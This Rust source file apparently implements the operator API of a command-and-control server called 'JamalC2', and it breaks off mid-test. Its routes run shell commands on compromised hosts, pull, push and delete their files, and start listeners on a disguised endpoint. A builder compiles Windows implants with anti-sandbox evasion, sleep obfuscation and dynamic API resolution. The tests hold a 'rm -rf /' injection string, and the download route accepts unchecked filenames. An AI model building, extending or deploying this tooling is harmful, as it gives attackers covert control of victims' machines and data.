//! Web API 路由模块
//! 提供 REST API 供前端调用

use axum::{
    extract::{Path, State},
    http::StatusCode,
    response::IntoResponse,
    routing::{get, post, delete},
    Json, Router,
};
use serde::{Deserialize, Serialize};
use chrono::Utc;

use crate::state::{SharedState, ListenerConfig};
use crate::listener::send_to_client;
use shared::messages::{Message, ShellExecute, SetBeaconInterval};

// ============== 数据结构 ==============

#[derive(Debug, Serialize)]
pub struct ClientInfo {
    pub id: String,
    pub ip_address: String,
    pub version: String,
    pub operating_system: String,
    pub account_type: String,
    pub country: String,
    pub username: String,
    pub pc_name: String,
    pub tag: String,
    pub connected_at: String,
    pub last_seen: String,
    pub beacon_interval: u64,
}

#[derive(Debug, Serialize)]
pub struct ListenerInfo {
    pub id: String,
    pub name: String,
    pub bind_address: String,
    pub port: u16,
    pub is_running: bool,
    pub encryption_key: String,
}

#[derive(Debug, Deserialize)]
pub struct CreateListenerRequest {
    pub name: String,
    pub bind_address: String,
    pub port: u16,
    #[serde(default)]
    pub encryption_key: Option<String>,  // 可选，如果提供则使用用户的密钥
}

#[derive(Debug, Deserialize)]
pub struct ShellCommandRequest {
    pub command: String,
}

#[derive(Debug, Serialize)]
pub struct ShellResponseInfo {
    pub output: String,
    pub is_error: bool,
    pub timestamp: i64,
}

#[derive(Debug, Deserialize)]
pub struct SetBeaconRequest {
    pub interval_seconds: u64,
}

// ============== API 路由 ==============

pub fn create_api_routes() -> Router<SharedState> {
    Router::new()
        // 客户端管理
        .route("/clients", get(get_clients))
        .route("/clients/:id", delete(disconnect_client))
        .route("/clients/:id/shell", post(send_shell_command))
        .route("/clients/:id/shell", get(get_shell_responses))
        .route("/clients/:id/beacon", post(set_beacon_interval))
        // 文件管理
        .route("/clients/:id/files", get(get_file_responses))
        .route("/clients/:id/files/list", post(list_directory))
        .route("/clients/:id/files/download", post(download_file))
        .route("/clients/:id/files/upload", post(upload_file))
        .route("/clients/:id/files/delete", post(delete_file))
        // 监听器管理
        .route("/listeners", get(get_listeners))
        .route("/listeners", post(create_listener))
        .route("/listeners/:id", delete(delete_listener))
        .route("/listeners/:id/start", post(start_listener))
        .route("/listeners/:id/stop", post(stop_listener))
        // Builder
        .route("/builder/build", post(build_implant))
        .route("/builder/download/:filename", get(download_built_implant))
}

// ============== 客户端 API ==============

/// GET /api/clients - 获取所有客户端
async fn get_clients(State(state): State<SharedState>) -> Json<Vec<ClientInfo>> {
    let now = Utc::now();
    
    // 使用单次 write 锁同时清理超时客户端并收集列表，避免读写锁竞态
    let clients: Vec<ClientInfo> = {
        let mut clients_map = state.clients.write();
        
        // 清理超时客户端
        let timeout_ids: Vec<String> = clients_map.iter()
            .filter_map(|(id, c)| {
                let calculated = c.beacon_interval * 3 + 30;
                let timeout_seconds = std::cmp::max(calculated, 120) as i64;
                let elapsed = now.signed_duration_since(c.last_seen).num_seconds();
                if elapsed > timeout_seconds {
                    Some(id.clone())
                } else {
                    None
                }
            })
            .collect();
        
        for id in &timeout_ids {
            clients_map.remove(id);
            println!("[*] Client {} timed out and removed", id);
        }
        
        // 收集客户端列表
        clients_map.values()
            .map(|c| ClientInfo {
                id: c.id.clone(),
                ip_address: c.ip_address.clone(),
                version: c.version.clone(),
                operating_system: c.operating_system.clone(),
                account_type: c.account_type.clone(),
                country: c.country.clone(),
                username: c.username.clone(),
                pc_name: c.pc_name.clone(),
                tag: c.tag.clone(),
                connected_at: c.connected_at.to_rfc3339(),
                last_seen: c.last_seen.to_rfc3339(),
                beacon_interval: c.beacon_interval,
            })
            .collect()
    };
    
    Json(clients)
}

/// DELETE /api/clients/:id - 断开客户端
async fn disconnect_client(
    State(state): State<SharedState>,
    Path(client_id): Path<String>,
) -> impl IntoResponse {
    // 发送 Exit 命令
    let msg = Message::Exit;
    if let Ok(data) = msg.serialize() {
        send_to_client(&state, &client_id, &data);
    }
    
    // 从数据库删除（防止重启后出现幽灵客户端）
    if let Some(ref db) = state.db {
        let _ = db.delete_client(&client_id);
    }
    
    // 从内存列表移除，但保留 pending_commands 让 Implant 能收到 Exit
    state.clients.write().remove(&client_id);
    
    StatusCode::OK
}

/// POST /api/clients/:id/shell - 发送 Shell 命令
async fn send_shell_command(
    State(state): State<SharedState>,
    Path(client_id): Path<String>,
    Json(req): Json<ShellCommandRequest>,
) -> impl IntoResponse {
    let msg = Message::ShellExecute(ShellExecute { command: req.command });
    match msg.serialize() {
        Ok(data) => {
            send_to_client(&state, &client_id, &data);
            StatusCode::OK
        }
        Err(_) => StatusCode::INTERNAL_SERVER_ERROR
    }
}

/// GET /api/clients/:id/shell - 获取 Shell 响应
async fn get_shell_responses(
    State(state): State<SharedState>,
    Path(client_id): Path<String>,
) -> Json<Vec<ShellResponseInfo>> {
    let responses: Vec<ShellResponseInfo> = state.take_shell_responses(&client_id)
        .into_iter()
        .map(|r| ShellResponseInfo {
            output: r.output,
            is_error: r.is_error,
            timestamp: r.timestamp,
        })
        .collect();
    
    Json(responses)
}

/// POST /api/clients/:id/beacon - 设置心跳间隔
async fn set_beacon_interval(
    State(state): State<SharedState>,
    Path(client_id): Path<String>,
    Json(req): Json<SetBeaconRequest>,
) -> impl IntoResponse {
    let msg = Message::SetBeaconInterval(SetBeaconInterval { 
        interval_seconds: req.interval_seconds 
    });
    
    if let Ok(data) = msg.serialize() {
        send_to_client(&state, &client_id, &data);
        
        // 更新服务端存储
        if let Some(client) = state.clients.write().get_mut(&client_id) {
            client.beacon_interval = req.interval_seconds;
        }
        
        StatusCode::OK
    } else {
        StatusCode::INTERNAL_SERVER_ERROR
    }
}

// ============== 监听器 API ==============

/// GET /api/listeners - 获取所有监听器
async fn get_listeners(State(state): State<SharedState>) -> Json<Vec<ListenerInfo>> {
    let listeners: Vec<ListenerInfo> = state.get_listeners()
        .into_iter()
        .map(|l| ListenerInfo {
            id: l.id,
            name: l.name,
            bind_address: l.bind_address,
            port: l.port,
            is_running: l.is_running,
            encryption_key: l.encryption_key,
        })
        .collect();
    
    Json(listeners)
}

/// POST /api/listeners - 创建监听器
async fn create_listener(
    State(state): State<SharedState>,
    Json(req): Json<CreateListenerRequest>,
) -> impl IntoResponse {
    use shared::crypto::Crypto;
    
    // 使用用户提供的密钥或生成随机密钥
    let key_hex = match &req.encryption_key {
        Some(key) if key.len() == 64 => key.clone(),  // 64 hex chars = 32 bytes
        _ => Crypto::generate_key_hex(),
    };
    
    let listener = ListenerConfig {
        id: uuid::Uuid::new_v4().to_string(),
        name: req.name,
        bind_address: req.bind_address,
        port: req.port,
        is_running: false,
        encryption_key: key_hex,
    };
    
    let info = ListenerInfo {
        id: listener.id.clone(),
        name: listener.name.clone(),
        bind_address: listener.bind_address.clone(),
        port: listener.port,
        is_running: listener.is_running,
        encryption_key: listener.encryption_key.clone(),
    };
    
    state.add_listener(listener);
    
    (StatusCode::CREATED, Json(info))
}

/// DELETE /api/listeners/:id - 删除监听器
async fn delete_listener(
    State(state): State<SharedState>,
    Path(listener_id): Path<String>,
) -> impl IntoResponse {
    // 如果监听器正在运行，先停止它
    if let Some(shutdown_tx) = state.listener_shutdown.write().remove(&listener_id) {
        let _ = shutdown_tx.send(());
        println!("[*] Stopped running listener {} before deletion", listener_id);
    }
    state.delete_listener(&listener_id);
    StatusCode::OK
}

/// POST /api/listeners/:id/start - 启动监听器
async fn start_listener(
    State(state): State<SharedState>,
    Path(listener_id): Path<String>,
) -> impl IntoResponse {
    // 获取监听器配置
    let listener_config = {
        let listeners = state.listeners.read();
        listeners.get(&listener_id).cloned()
    };
    
    let config = match listener_config {
        Some(c) => c,
        None => return StatusCode::NOT_FOUND,
    };
    
    // 检查是否已经在运行
    if config.is_running {
        return StatusCode::OK;
    }
    
    // 创建 C2 路由
    let state_clone = state.clone();
    let (shutdown_tx, shutdown_rx) = tokio::sync::oneshot::channel::<()>();
    
    let bind_addr = format!("{}:{}", config.bind_address, config.port);
    let bind_addr_clone = bind_addr.clone();
    let listener_id_clone = listener_id.clone();
    
    // 在后台启动服务器
    tokio::spawn(async move {
        use axum::Router;
        use axum::routing::{post, get};
        use std::net::SocketAddr;
        
        let app = Router::new()
            .route("/api/CpHDCPSvc", post(crate::listener::handle_c2))
            .route("/api/health", get(|| async { "OK" }))
            .with_state(state_clone);
        
        let addr: SocketAddr = match bind_addr_clone.parse() {
            Ok(a) => a,
            Err(e) => {
                eprintln!("[!] Invalid bind address {}: {}", bind_addr_clone, e);
                return;
            }
        };
        
        let listener = match tokio::net::TcpListener::bind(addr).await {
            Ok(l) => l,
            Err(e) => {
                eprintln!("[!] Failed to bind {}: {}", addr, e);
                return;
            }
        };
        
        println!("[*] C2 Listener started on {}", addr);
        
        // 使用 graceful shutdown
        let addr_for_shutdown = addr;
        axum::serve(listener, app.into_make_service_with_connect_info::<SocketAddr>())
            .with_graceful_shutdown(async move {
                let _ = shutdown_rx.await;
                println!("[*] C2 Listener on {} shutting down", addr_for_shutdown);
            })
            .await
            .ok();
    });
    
    // 保存 shutdown sender
    state.listener_shutdown.write().insert(listener_id.clone(), shutdown_tx);
    
    // 更新状态
    state.update_listener_status(&listener_id, true);
    
    println!("[*] Listener {} started on {}", listener_id, bind_addr);
    StatusCode::OK
}

/// POST /api/listeners/:id/stop - 停止监听器
async fn stop_listener(
    State(state): State<SharedState>,
    Path(listener_id): Path<String>,
) -> impl IntoResponse {
    // 发送关闭信号
    if let Some(shutdown_tx) = state.listener_shutdown.write().remove(&listener_id) {
        let _ = shutdown_tx.send(());
    }
    
    // 更新状态
    state.update_listener_status(&listener_id, false);
    StatusCode::OK
}

// ============== 文件管理 API ==============

#[derive(Debug, Deserialize)]
pub struct FilePathRequest {
    pub path: String,
}

#[derive(Debug, Deserialize)]
pub struct FileUploadRequest {
    pub path: String,
    pub data: String,  // Base64 encoded
}

#[derive(Debug, Serialize)]
pub struct FileEntryResponse {
    pub name: String,
    pub path: String,
    pub is_dir: bool,
    pub size: u64,
    pub modified: i64,
}

#[derive(Debug, Serialize)]
pub struct FileListResponse {
    pub entries: Vec<FileEntryResponse>,
    pub error: Option<String>,
}

/// GET /api/clients/:id/files - 获取文件响应（轮询）
async fn get_file_responses(
    State(state): State<SharedState>,
    Path(client_id): Path<String>,
) -> impl IntoResponse {
    let responses = state.take_file_responses(&client_id);
    Json(responses)
}

/// POST /api/clients/:id/files/list - 列出目录
async fn list_directory(
    State(state): State<SharedState>,
    Path(client_id): Path<String>,
    Json(req): Json<FilePathRequest>,
) -> impl IntoResponse {
    use shared::messages::{Message, GetDirectoryListing};
    
    let msg = Message::GetDirectoryListing(GetDirectoryListing { path: req.path });
    
    if let Ok(data) = msg.serialize() {
        send_to_client(&state, &client_id, &data);
        StatusCode::OK
    } else {
        StatusCode::INTERNAL_SERVER_ERROR
    }
}

/// POST /api/clients/:id/files/download - 下载文件
async fn download_file(
    State(state): State<SharedState>,
    Path(client_id): Path<String>,
    Json(req): Json<FilePathRequest>,
) -> impl IntoResponse {
    use shared::messages::{Message, FileDownload};
    
    let msg = Message::FileDownload(FileDownload { path: req.path });
    
    if let Ok(data) = msg.serialize() {
        send_to_client(&state, &client_id, &data);
        StatusCode::OK
    } else {
        StatusCode::INTERNAL_SERVER_ERROR
    }
}

/// POST /api/clients/:id/files/upload - 上传文件
async fn upload_file(
    State(state): State<SharedState>,
    Path(client_id): Path<String>,
    Json(req): Json<FileUploadRequest>,
) -> impl IntoResponse {
    use shared::messages::{Message, FileUpload};
    use base64::Engine;
    
    // Base64 解码
    let data = match base64::engine::general_purpose::STANDARD.decode(&req.data) {
        Ok(d) => d,
        Err(_) => return StatusCode::BAD_REQUEST,
    };
    
    let msg = Message::FileUpload(FileUpload { path: req.path, data, is_complete: true });
    
    if let Ok(data) = msg.serialize() {
        send_to_client(&state, &client_id, &data);
        StatusCode::OK
    } else {
        StatusCode::INTERNAL_SERVER_ERROR
    }
}

/// POST /api/clients/:id/files/delete - 删除文件
async fn delete_file(
    State(state): State<SharedState>,
    Path(client_id): Path<String>,
    Json(req): Json<FilePathRequest>,
) -> impl IntoResponse {
    use shared::messages::{Message, FileDelete};
    
    let msg = Message::FileDelete(FileDelete { path: req.path });
    
    if let Ok(data) = msg.serialize() {
        send_to_client(&state, &client_id, &data);
        StatusCode::OK
    } else {
        StatusCode::INTERNAL_SERVER_ERROR
    }
}

// ============== Builder API ==============

#[derive(Debug, Deserialize)]
pub struct BuildRequest {
    pub server_host: String,
    pub server_port: u16,
    pub use_tls: bool,
    pub tag: String,
    pub output_name: String,
    pub encryption_key: String,
    /// Implant 类型: "rust" 或 "c" (默认 "rust")
    #[serde(default = "default_implant_type")]
    pub implant_type: String,
}

fn default_implant_type() -> String {
    "rust".to_string()
}

#[derive(Debug, Serialize)]
pub struct BuildResult {
    pub success: bool,
    pub output_path: Option<String>,
    pub download_url: Option<String>,
    pub error: Option<String>,
}

/// POST /api/builder/build - 编译 Implant (支持 Rust 和 C 类型)
async fn build_implant(
    Json(request): Json<BuildRequest>,
) -> impl IntoResponse {
    match request.implant_type.as_str() {
        "c" => build_c_implant_cross(request).await,
        _ => build_rust_implant(request).await,
    }
}

/// 编译 Rust Implant (Linux 原生)
async fn build_rust_implant(
    request: BuildRequest,
) -> Json<BuildResult> {
    use std::process::Command;
    use std::fs;
    
    // 查找 implant 目录
    let implant_dir = find_implant_dir();
    if implant_dir.is_none() {
        return Json(BuildResult {
            success: false,
            output_path: None,
            download_url: None,
            error: Some("Implant source directory not found. Please ensure 'implant' dir exists relative to server.".to_string()),
        });
    }
    let implant_dir = implant_dir.unwrap();
    
    // 查找 shared 目录
    let shared_dir = implant_dir.parent()
        .map(|p| p.join("shared"));
    if shared_dir.is_none() || !shared_dir.as_ref().unwrap().exists() {
        return Json(BuildResult {
            success: false,
            output_path: None,
            download_url: None,
            error: Some("Shared library directory not found".to_string()),
        });
    }
    let shared_dir = shared_dir.unwrap();
    
    // 创建临时构建目录
    let build_id = uuid::Uuid::new_v4().to_string();
    let build_dir = std::path::PathBuf::from("/tmp").join(format!("jamalc2_build_{}", build_id));
    if let Err(e) = fs::create_dir_all(&build_dir) {
        return Json(BuildResult {
            success: false,
            output_path: None,
            download_url: None,
            error: Some(format!("Failed to create build dir: {}", e)),
        });
    }
    
    // 复制源码
    let temp_implant = build_dir.join("implant");
    let temp_shared = build_dir.join("shared");
    
    if let Err(e) = copy_dir_recursive(&implant_dir, &temp_implant) {
        let _ = fs::remove_dir_all(&build_dir);
        return Json(BuildResult {
            success: false,
            output_path: None,
            download_url: None,
            error: Some(format!("Failed to copy implant source: {}", e)),
        });
    }
    
    if let Err(e) = copy_dir_recursive(&shared_dir, &temp_shared) {
        let _ = fs::remove_dir_all(&build_dir);
        return Json(BuildResult {
            success: false,
            output_path: None,
            download_url: None,
            error: Some(format!("Failed to copy shared source: {}", e)),
        });
    }
    
    // 生成 config.rs
    let config_content = generate_rust_config(&request);
    let config_path = temp_implant.join("src").join("config.rs");
    if let Err(e) = fs::write(&config_path, config_content) {
        let _ = fs::remove_dir_all(&build_dir);
        return Json(BuildResult {
            success: false,
            output_path: None,
            download_url: None,
            error: Some(format!("Failed to write config: {}", e)),
        });
    }
    
    // 编译
    let output = Command::new("cargo")
        .args(["build", "--release"])
        .current_dir(&temp_implant)
        .output();
    
    match output {
        Ok(result) => {
            if !result.status.success() {
                let stderr = String::from_utf8_lossy(&result.stderr);
                let _ = fs::remove_dir_all(&build_dir);
                return Json(BuildResult {
                    success: false,
                    output_path: None,
                    download_url: None,
                    error: Some(format!("Build failed: {}", stderr)),
                });
            }
            
            // 复制到输出目录
            let built_binary = temp_implant.join("target").join("release").join("implant");
            let output_dir = std::path::PathBuf::from("/tmp/jamalc2_builds");
            let _ = fs::create_dir_all(&output_dir);
            
            let output_filename = request.output_name.clone();
            let output_path = output_dir.join(&output_filename);
            
            if let Err(e) = fs::copy(&built_binary, &output_path) {
                let _ = fs::remove_dir_all(&build_dir);
                return Json(BuildResult {
                    success: false,
                    output_path: None,
                    download_url: None,
                    error: Some(format!("Failed to copy binary: {}", e)),
                });
            }
            
            // 设置可执行权限
            #[cfg(unix)]
            {
                use std::os::unix::fs::PermissionsExt;
                let _ = fs::set_permissions(&output_path, fs::Permissions::from_mode(0o755));
            }
            
            // 清理临时目录
            let _ = fs::remove_dir_all(&build_dir);
            
            Json(BuildResult {
                success: true,
                output_path: Some(output_path.to_string_lossy().to_string()),
                download_url: Some(format!("/api/builder/download/{}", output_filename)),
                error: None,
            })
        }
        Err(e) => {
            let _ = fs::remove_dir_all(&build_dir);
            Json(BuildResult {
                success: false,
                output_path: None,
                download_url: None,
                error: Some(format!("Failed to run cargo: {}", e)),
            })
        }
    }
}

/// GET /api/builder/download/:filename - 下载编译好的 Implant
async fn download_built_implant(
    Path(filename): Path<String>,
) -> impl IntoResponse {
    use axum::body::Body;
    use axum::response::Response;
    use tokio::fs::File;
    use tokio_util::io::ReaderStream;
    
    let file_path = std::path::PathBuf::from("/tmp/jamalc2_builds").join(&filename);
    
    match File::open(&file_path).await {
        Ok(file) => {
            let stream = ReaderStream::new(file);
            let body = Body::from_stream(stream);
            
            Response::builder()
                .header("Content-Type", "application/octet-stream")
                .header("Content-Disposition", format!("attachment; filename=\"{}\"", filename))
                .body(body)
                .unwrap()
        }
        Err(_) => {
            Response::builder()
                .status(StatusCode::NOT_FOUND)
                .body(Body::from("File not found"))
                .unwrap()
        }
    }
}

/// 查找 implant 源码目录
fn find_implant_dir() -> Option<std::path::PathBuf> {
    let candidates = [
        std::path::PathBuf::from("./implant"),
        std::path::PathBuf::from("../implant"),
        std::path::PathBuf::from("../../implant"),
        std::path::PathBuf::from("/opt/jamalc2/implant"),
        std::env::current_exe().ok().and_then(|p| {
            p.parent()
                .and_then(|p| p.parent())
                .map(|p| p.join("implant"))
        }).unwrap_or_default(),
    ];
    
    for candidate in candidates {
        if candidate.exists() && candidate.join("Cargo.toml").exists() {
            return Some(candidate);
        }
    }
    None
}

/// 对字符串进行转义，防止 Rust 字符串字面量注入
fn sanitize_rust_string(input: &str) -> String {
    input.replace('\\', "\\\\").replace('"', "\\\"").replace('\n', "\\n").replace('\r', "\\r")
}

/// 生成 Rust 配置文件
fn generate_rust_config(request: &BuildRequest) -> String {
    let host = sanitize_rust_string(&request.server_host);
    let tag = sanitize_rust_string(&request.tag);
    let key = sanitize_rust_string(&request.encryption_key);
    
    format!(r#"//! Implant 配置
//! 这些值会在生成时被 Builder 修改

/// 服务器地址 (IP 或域名)
pub const SERVER_HOST: &str = "{}";

/// 服务器端口
pub const SERVER_PORT: u16 = {};

/// 使用 HTTPS
pub const USE_TLS: bool = {};

/// 客户端标签
pub const TAG: &str = "{}";

/// Beacon 轮询间隔 (秒)
pub const HEARTBEAT_INTERVAL: u64 = 30;

/// 重连延迟 (秒)
pub const RECONNECT_DELAY: u64 = 5;

/// 版本号
pub const VERSION: &str = "1.0.0";

/// 加密密钥 (64 hex chars = 32 bytes)
pub const ENCRYPTION_KEY: &str = "{}";

/// 是否跳过启动密钥检查
pub const SKIP_KEY_CHECK: bool = true;

/// 获取服务器 HTTP URL
pub fn get_http_url() -> String {{
    let scheme = if USE_TLS {{ "https" }} else {{ "http" }};
    format!("{{}}://{{}}:{{}}", scheme, SERVER_HOST, SERVER_PORT)
}}

// 兼容函数
pub fn get_server_host() -> &'static str {{ SERVER_HOST }}
pub fn get_server_port() -> u16 {{ SERVER_PORT }}
pub fn get_use_tls() -> bool {{ USE_TLS }}
pub fn get_tag() -> &'static str {{ TAG }}
pub fn get_encryption_key() -> &'static str {{ ENCRYPTION_KEY }}
"#, host, request.server_port, request.use_tls, tag, key)
}

/// 递归复制目录
fn copy_dir_recursive(src: &std::path::PathBuf, dst: &std::path::PathBuf) -> std::io::Result<()> {
    use std::fs;
    
    if !dst.exists() {
        fs::create_dir_all(dst)?;
    }
    
    for entry in fs::read_dir(src)? {
        let entry = entry?;
        let src_path = entry.path();
        let dst_path = dst.join(entry.file_name());
        
        if src_path.is_dir() {
            // 跳过 target 和 build 目录
            let name = entry.file_name();
            if name == "target" || name == "build" {
                continue;
            }
            copy_dir_recursive(&src_path, &dst_path)?;
        } else {
            fs::copy(&src_path, &dst_path)?;
        }
    }
    
    Ok(())
}

/// 查找 C implant 源码目录
fn find_implant_c_dir() -> Option<std::path::PathBuf> {
    let candidates = [
        std::path::PathBuf::from("./implant-c"),
        std::path::PathBuf::from("../implant-c"),
        std::path::PathBuf::from("../../implant-c"),
        std::path::PathBuf::from("/opt/jamalc2/implant-c"),
        std::env::current_exe().ok().and_then(|p| {
            p.parent()
                .and_then(|p| p.parent())
                .map(|p| p.join("implant-c"))
        }).unwrap_or_default(),
    ];
    
    for candidate in candidates {
        if candidate.exists() && candidate.join("src").join("main.c").exists() {
            return Some(candidate);
        }
    }
    None
}

/// 对字符串进行转义，防止 C 字符串字面量注入
fn sanitize_c_string(input: &str) -> String {
    input.replace('\\', "\\\\").replace('"', "\\\"").replace('\n', "\\n").replace('\r', "\\r")
}

/// 生成 C 配置文件 (config.h)
fn generate_c_config(request: &BuildRequest) -> String {
    let use_tls = if request.use_tls { 1 } else { 0 };
    let host = sanitize_c_string(&request.server_host);
    let tag = sanitize_c_string(&request.tag);
    let key = sanitize_c_string(&request.encryption_key);
    
    format!(r#"/*
 * JamalC2 Implant - Configuration Header
 * This file is auto-generated by the Builder
 */

#ifndef CONFIG_H
#define CONFIG_H

// Server Configuration
#define SERVER_HOST "{}"
#define SERVER_PORT {}
#define USE_TLS {}

// Client Configuration
#define TAG "{}"
#define VERSION "1.0.0"

// Beacon Configuration
#define HEARTBEAT_INTERVAL 30 // seconds
#define RECONNECT_DELAY 5     // seconds
#define JITTER_PERCENT 20     // 0-100%

// Encryption Key (64 hex chars = 32 bytes)
#define ENCRYPTION_KEY \
  "{}"

// Run Key (for execution validation)
#define RUN_KEY "321"
#define SKIP_KEY_CHECK 0

// API Paths (all requests go to same endpoint, type is in encrypted payload)
#define API_CHECKIN "/api/CpHDCPSvc"
#define API_RESULT "/api/CpHDCPSvc"

// === Evasion Settings ===
#define ENABLE_EVASION 1      // Anti-sandbox detection
#define EVASION_EXIT_SILENT 1 // Exit silently if sandbox detected
#define ENABLE_DYNAPI 1       // Dynamic API resolution
#define ENABLE_SLEEP_OBF 1    // Sleep obfuscation

// Debug mode (set to 0 to disable all console output)
#define DEBUG_MODE 0

// Debug print macro
#if DEBUG_MODE
    #define DEBUG_PRINT(...) printf(__VA_ARGS__)
#else
    #define DEBUG_PRINT(...) ((void)0)
#endif

#endif // CONFIG_H
"#, host, request.server_port, use_tls, tag, key)
}

/// 编译 C Implant (使用 MinGW-w64 交叉编译)
async fn build_c_implant_cross(request: BuildRequest) -> Json<BuildResult> {
    use std::process::Command;
    use std::fs;
    
    // 查找 implant-c 目录
    let implant_c_dir = find_implant_c_dir();
    if implant_c_dir.is_none() {
        return Json(BuildResult {
            success: false,
            output_path: None,
            download_url: None,
            error: Some("C Implant source directory not found. Please ensure 'implant-c' dir exists relative to server.".to_string()),
        });
    }
    let implant_c_dir = implant_c_dir.unwrap();
    
    // 创建临时构建目录
    let build_id = uuid::Uuid::new_v4().to_string();
    let build_dir = std::path::PathBuf::from("/tmp").join(format!("jamalc2_c_build_{}", build_id));
    if let Err(e) = fs::create_dir_all(&build_dir) {
        return Json(BuildResult {
            success: false,
            output_path: None,
            download_url: None,
            error: Some(format!("Failed to create build dir: {}", e)),
        });
    }
    
    // 复制源码
    let temp_implant = build_dir.join("implant-c");
    if let Err(e) = copy_dir_recursive(&implant_c_dir, &temp_implant) {
        let _ = fs::remove_dir_all(&build_dir);
        return Json(BuildResult {
            success: false,
            output_path: None,
            download_url: None,
            error: Some(format!("Failed to copy C implant source: {}", e)),
        });
    }
    
    // 生成 config.h
    let config_content = generate_c_config(&request);
    let config_path = temp_implant.join("src").join("config.h");
    if let Err(e) = fs::write(&config_path, config_content) {
        let _ = fs::remove_dir_all(&build_dir);
        return Json(BuildResult {
            success: false,
            output_path: None,
            download_url: None,
            error: Some(format!("Failed to write config.h: {}", e)),
        });
    }
    
    // 创建输出目录
    let output_build_dir = temp_implant.join("build");
    let _ = fs::create_dir_all(&output_build_dir);
    
    // 使用 MinGW-w64 交叉编译
    // 源文件列表
    let source_files = [
        "src/main.c",
        "src/http.c",
        "src/crypto.c",
        "src/protocol.c",
        "src/shell.c",
        "src/files.c",
        "src/process.c",
        "src/utils.c",
        "src/evasion.c",
        "src/dynapi.c",
        "src/sleep_obf.c",
    ];
    
    let output_exe = output_build_dir.join("implant.exe");
    
    // 构建编译命令
    let mut args: Vec<&str> = vec![
        "-O2",           // 优化
        "-s",            // Strip symbols
        "-mwindows",     // Windows subsystem (no console)
        "-DNDEBUG",
        "-D_CRT_SECURE_NO_WARNINGS",
        "-I", "src",
    ];
    
    // 添加源文件
    for src in &source_files {
        args.push(src);
    }
    
    // 链接库
    args.extend_from_slice(&[
        "-lwinhttp",
        "-ladvapi32",
        "-luser32",
        "-lshell32",
        "-lcrypt32",
        "-o",
    ]);
    
    let output_exe_str = output_exe.to_string_lossy().to_string();
    
    // 尝试不同的 MinGW 编译器名称
    let compilers = ["x86_64-w64-mingw32-gcc", "mingw64-gcc", "i686-w64-mingw32-gcc"];
    let mut compile_result = None;
    
    for compiler in compilers {
        let mut cmd_args = args.clone();
        cmd_args.push(&output_exe_str);
        
        let result = Command::new(compiler)
            .args(&cmd_args)
            .current_dir(&temp_implant)
            .output();
        
        match result {
            Ok(output) => {
                compile_result = Some((compiler, output));
                break;
            }
            Err(_) => continue,
        }
    }
    
    match compile_result {
        Some((compiler, output)) => {
            if !output.status.success() {
                let stderr = String::from_utf8_lossy(&output.stderr);
                let stdout = String::from_utf8_lossy(&output.stdout);
                let _ = fs::remove_dir_all(&build_dir);
                return Json(BuildResult {
                    success: false,
                    output_path: None,
                    download_url: None,
                    error: Some(format!("C Build failed with {}:\nstdout: {}\nstderr: {}", compiler, stdout, stderr)),
                });
            }
            
            // 复制到输出目录
            let final_output_dir = std::path::PathBuf::from("/tmp/jamalc2_builds");
            let _ = fs::create_dir_all(&final_output_dir);
            
            let output_filename = format!("{}.exe", request.output_name);
            let final_output_path = final_output_dir.join(&output_filename);
            
            if let Err(e) = fs::copy(&output_exe, &final_output_path) {
                let _ = fs::remove_dir_all(&build_dir);
                return Json(BuildResult {
                    success: false,
                    output_path: None,
                    download_url: None,
                    error: Some(format!("Failed to copy binary: {}", e)),
                });
            }
            
            // 清理临时目录
            let _ = fs::remove_dir_all(&build_dir);
            
            Json(BuildResult {
                success: true,
                output_path: Some(final_output_path.to_string_lossy().to_string()),
                download_url: Some(format!("/api/builder/download/{}", output_filename)),
                error: None,
            })
        }
        None => {
            let _ = fs::remove_dir_all(&build_dir);
            Json(BuildResult {
                success: false,
                output_path: None,
                download_url: None,
                error: Some("MinGW-w64 cross-compiler not found. Please install mingw-w64 package (e.g., apt install mingw-w64)".to_string()),
            })
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_sanitize_rust_string_normal() {
        assert_eq!(sanitize_rust_string("hello"), "hello");
        assert_eq!(sanitize_rust_string("192.168.1.1"), "192.168.1.1");
    }

    #[test]
    fn test_sanitize_rust_string_escapes() {
        assert_eq!(sanitize_rust_string(r#"a"b"#), r#"a\"b"#);
        assert_eq!(sanitize_rust_string("a\\b"), "a\\\\b");
        assert_eq!(sanitize_rust_string("a\nb"), "a\\nb");
        assert_eq!(sanitize_rust_string("a\rb"), "a\\rb");
    }

    #[test]
    fn test_sanitize_rust_string_injection() {
        // 尝试注入 Rust 代码
        let evil = r#""; std::process::exit(1); //"#;
        let sanitized = sanitize_rust_string(evil);
        // 转义后引号前应有反斜杠
        assert!(sanitized.starts_with("\\\""));
        // 不应包含未转义的独立引号（不以反斜杠开头的 ")
        assert!(!sanitized.contains(r#"" "#));  // 转义后不会有 " 后跟空格的模式
    }

    #[test]
    fn test_sanitize_c_string_normal() {
        assert_eq!(sanitize_c_string("hello"), "hello");
        assert_eq!(sanitize_c_string("10.0.0.1"), "10.0.0.1");
    }

    #[test]
    fn test_sanitize_c_string_escapes() {
        assert_eq!(sanitize_c_string(r#"a"b"#), r#"a\"b"#);
        assert_eq!(sanitize_c_string("a\\b"), "a\\\\b");
    }

    #[test]
    fn test_generate_rust_config_contains_values() {
        let req = BuildRequest {
            server_host: "10.0.0.1".to_string(),
            server_port: 8443,
            use_tls: true,
            tag: "test-tag".to_string(),
            output_name: "test".to_string(),
            encryption_key: "a".repeat(64),
            implant_type: "rust".to_string(),
        };
        let config = generate_rust_config(&req);
        
        assert!(config.contains("10.0.0.1"));
        assert!(config.contains("8443"));
        assert!(config.contains("true"));
        assert!(config.contains("test-tag"));
        assert!(config.contains(&"a".repeat(64)));
    }

    #[test]
    fn test_generate_c_config_contains_values() {
        let req = BuildRequest {
            server_host: "192.168.1.100".to_string(),
            server_port: 80,
            use_tls: false,
            tag: "c-implant".to_string(),
            output_name: "test.exe".to_string(),
            encryption_key: "b".repeat(64),
            implant_type: "c".to_string(),
        };
        let config = generate_c_config(&req);
        
        assert!(config.contains("192.168.1.100"));
        assert!(config.contains("80"));
        assert!(config.contains("USE_TLS 0"));
        assert!(config.contains("c-implant"));
    }

    #[test]
    fn test_generate_config_with_malicious_input() {
        let req = BuildRequest {
            server_host: r#""; system("rm -rf /"); //"#.to_string(),
            server_port: 80,
            use_tls: false,
            tag: "normal".to_string(),
            output_name: "test".to_string(),
            encryption_key: "c".repeat(64),
            implant_type: "rust".to_string(),
        };
        
        let rust_config = generate_rust_config(&req);
        // 转义后不应包含未转义的引号+分号组合
        // 实际转义结果：\"; system(\"rm -rf /\"); //
        // 作为字符串字面量不会截断
